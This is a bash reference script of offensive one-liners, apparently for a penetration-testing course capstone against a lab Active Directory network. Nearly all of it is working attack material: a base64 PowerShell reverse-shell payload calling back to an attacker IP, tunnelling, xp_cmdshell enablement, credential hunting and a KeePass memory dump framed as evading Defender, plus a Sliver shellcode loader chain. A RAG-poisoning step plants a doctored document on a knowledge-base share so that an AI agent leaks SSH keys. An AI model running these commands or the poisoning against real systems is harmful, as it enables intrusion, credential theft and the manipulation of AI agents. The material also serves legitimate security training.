#!/bin/bash
# Script: oneliners.sh
# Module: 11 — Assembling The Pieces (Capstone)
# Purpose: Quick reference — all key one-liners for the capstone engagement
# Usage:   Reference only — copy individual commands as needed

# ── PHASE 1: Initial Access ───────────────────────────────────────────────────

# Start netcat listener (rlwrap for arrow-key history)
rlwrap nc -lvnp 4444

# Generate base64-encoded PowerShell reverse shell payload
LHOST=10.10.10.10; LPORT=4444
python3 -c "
import base64
ps = '\$c=New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};\$k=(\$s.Read(\$b,0,(\$b.Length)));IEX([text.encoding]::ASCII.GetString(\$b,0,\$k));'
print(base64.b64encode(ps.encode('utf-16-le')).decode())"

# ── PHASE 2: Tunnelling ───────────────────────────────────────────────────────

# Chisel server (attacker)
chisel server --reverse --port 8080

# Chisel client DMZ tunnel → SOCKS on 1080
# (run on DMZ Windows box):
# .\chisel.exe client <ATTACKER>:8080 R:1080:socks

# Add each tunnel to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
# socks5 127.0.0.1 1082

# Nmap through tunnel
proxychains4 -q nmap -sT -Pn -p 445,1433,3389,22 10.10.20.0/24

# CrackMapExec SMB sweep
proxychains4 -q crackmapexec smb 10.10.20.0/24

# ── PHASE 2: Active Directory Enum ───────────────────────────────────────────

# adsisearcher — no child process, stealthiest AD enum (run in PowerShell):
# ([adsisearcher]'(objectclass=computer)').FindAll()|%{$_.properties.name}
# ([adsisearcher]'(objectclass=user)').FindAll()|%{$_.properties.samaccountname}
# ([adsisearcher]'(&(objectclass=group)(name=Domain Admins))').FindAll()|%{$_.properties.member}

# GenericWrite → add self to group (PowerShell on target):
# $g=[ADSI]"LDAP://CN=VPN Users,OU=Groups,DC=corp,DC=local"
# $g.Add("LDAP://CN=webservice,CN=Users,DC=corp,DC=local")

# PSReadLine history (credential hunting):
# gc "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# ── PHASE 3: MSSQL Lateral Movement ──────────────────────────────────────────

# Enable xp_cmdshell (via sqlcmd, proxychains):
proxychains4 -q sqlcmd -S dev-db01.corp.local -E \
  -Q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE"

# Run command via xp_cmdshell:
proxychains4 -q sqlcmd -S dev-db01.corp.local -E \
  -Q "EXEC xp_cmdshell 'whoami'"

# RDP through RDS Gateway:
proxychains4 -q xfreerdp /v:dev-rdsgw01.corp.local \
  /u:webservice /p:'PASSWORD' /d:corp.local +clipboard /dynamic-resolution

# ── PHASE 4: Python Module Hijack ────────────────────────────────────────────

# Find target script's working directory (PowerShell on target):
# Get-Process python* | Select-Object Id,Path,@{N='CWD';E={$_.MainModule.FileName}}
# Or check scheduled task:
# Get-ScheduledTask | Where-Object {$_.Actions.Execute -match 'python'} | fl *

# Upload malicious_pandas.py to CWD via SMB or existing shell

# ── PHASE 5: KeePass Memory Dump ─────────────────────────────────────────────

# Dump with procdump64 (Sysinternals signed — Defender safe):
# procdump64.exe -ma KeePass.exe keepass.dmp

# Extract strings from dump (Linux):
strings -e l keepass.dmp | grep -iE "pass|vault|admin|master" | head -50

# XOR decrypt Go binary (key 0x4D):
python3 -c "
key=0x4D
data=open('binary','rb').read()
print(bytes(b^key for b in data).decode('utf-8','ignore'))" 2>/dev/null | strings | head -50

# ── PHASE 6: RAG Poisoning ───────────────────────────────────────────────────

# Write poisoned doc to Knowledgebase SMB share:
smbclient //FILESERVER01/Knowledgebase -U 'corp\svc_ai%PASSWORD' \
  -c "put poisoned_policy.docx \"HR Policies.docx\""

# Monitor agent.log for SSH key leak:
# tail -f "C:\ProgramData\nexus-ai\logs\agent.log"

# SSH to DC via non-standard port:
ssh -i id_rsa -p 2222 Administrator@DC01.corp.local

# ── SHELLCODE GENERATION CHAIN ───────────────────────────────────────────────

# 1. Sliver: generate shellcode
# generate --os windows --arch amd64 --format shellcode -o beacon.bin

# 2. Encrypt shellcode → header
python3 xor_encrypt.py beacon.bin shellcode.h

# 3. Compile loader
x86_64-w64-mingw32-gcc loader.c -o beacon.exe -luser32 -Os -s

# 4. Generate XOR C# shell
./gen_cs_shell.sh tun0 4444 /tmp/shells

# ── OPSEC ─────────────────────────────────────────────────────────────────────

# Check for honeypot tokens before running noisy commands:
# sts:GetCallerIdentity (always works, but leaves CloudTrail)
# aws sts get-caller-identity

# Verify xp_cmdshell is back to disabled after engagement:
# EXEC sp_configure 'xp_cmdshell'; -- check config_value = 0
